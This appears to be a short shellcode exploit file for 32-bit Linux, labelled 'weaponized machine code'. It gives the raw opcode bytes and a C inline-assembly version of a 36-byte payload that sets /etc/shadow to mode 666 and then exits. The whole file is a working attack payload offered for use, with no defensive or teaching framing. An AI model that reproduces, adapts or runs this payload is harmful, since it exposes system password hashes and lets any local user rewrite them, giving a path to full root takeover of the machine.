// Linux Shellcode Chmod 666 /etc/shadow - 36 Bytes
// Exploit payload that sets system password file /etc/shadow to read and write for all users 
// BareMetal Networks Corporation (C) 2009 SJK
// Weaponized Machine Code: 
// \x31\xc0\x50\x68\x61\x64\x6f\x77\x68\x2f\x2f\x73\x68\x68\x2f\x65\x74\x63\x89\xe3\x66\x68\xb6\x01\x59\xb0\x0f\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80

#include <stdio.h>
int main(){
  __asm__(
  "xor	%eax, %eax\n\t"
  "push   %eax\n\t"
  "push	$0x776f6461\n\t"
  "push	$0x68732f2f\n\t"
  "push	$0x6374652f\n\t"
  "mov    %esp, %ebx\n\t"
  "push	$0x1b6\n\t"
  "pop	%ecx\n\t"
  "mov    $0xf,%al\n\t"
  "int    $0x80\n\t"
  "xorl   %ebx,%ebx\n\t"               
  "movl   %ebx,%eax\n\t"
  "inc 	%eax\n\t"               
  "int    $0x80\n\t");    
}
